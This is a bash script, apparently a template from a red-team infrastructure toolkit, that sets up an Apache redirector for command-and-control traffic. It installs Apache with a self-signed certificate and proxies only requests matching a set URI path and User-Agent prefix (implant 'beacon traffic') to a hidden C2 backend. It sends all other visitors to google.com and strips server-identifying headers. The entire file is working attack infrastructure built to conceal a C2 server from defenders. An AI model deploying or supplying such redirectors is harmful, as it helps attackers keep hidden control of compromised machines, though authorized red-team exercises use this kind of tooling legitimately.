#!/bin/bash
# @name: redirector-apache
# @desc: Apache2 mod_rewrite redirector with C2 profile URI filtering
# @var: C2BackendHost=10.20.0.2 - Private IP or hostname of the C2 node
# @var: C2BackendPort=443 - C2 backend port
# @var: ListenPort=443 - Public listening port
# @var: C2UserAgent=Mozilla/5.0 - User-Agent prefix that beacon traffic matches
# @var: C2URIPath=/updates - URI path to forward to C2 backend
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

apt-get update -y
apt-get install -y apache2 openssl

a2enmod ssl rewrite proxy proxy_http proxy_https headers

CERT_DIR=/etc/apache2/ssl
mkdir -p "$CERT_DIR"
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout "$CERT_DIR/server.key" \
    -out "$CERT_DIR/server.crt" \
    -subj "/CN=localhost"

cat > /etc/apache2/sites-available/redirector.conf << 'APACHECFG'
<VirtualHost *:80>
    RewriteEngine On
    RewriteRule ^(.*)$ https://%{HTTP_HOST}$1 [R=301,L]
</VirtualHost>

<VirtualHost *:{{.ListenPort}}>
    SSLEngine On
    SSLCertificateFile    /etc/apache2/ssl/server.crt
    SSLCertificateKeyFile /etc/apache2/ssl/server.key

    SSLProxyEngine On
    SSLProxyVerify none
    SSLProxyCheckPeerName off

    RewriteEngine On

    # Forward requests with matching URI AND User-Agent prefix to C2
    RewriteCond %{REQUEST_URI} ^{{.C2URIPath}}
    RewriteCond %{HTTP_USER_AGENT} ^{{.C2UserAgent}}
    RewriteRule ^(.*)$ https://{{.C2BackendHost}}:{{.C2BackendPort}}$1 [P,L]

    # Everything else: redirect to a benign site
    RewriteRule ^(.*)$ https://www.google.com [R=301,L]

    Header always unset X-Powered-By
    ServerSignature Off
</VirtualHost>
APACHECFG

a2ensite redirector
a2dissite 000-default
apache2ctl configtest
systemctl enable --now apache2
echo "[redirector-apache] forwarding UA={{.C2UserAgent}} URI={{.C2URIPath}} -> https://{{.C2BackendHost}}:{{.C2BackendPort}}"
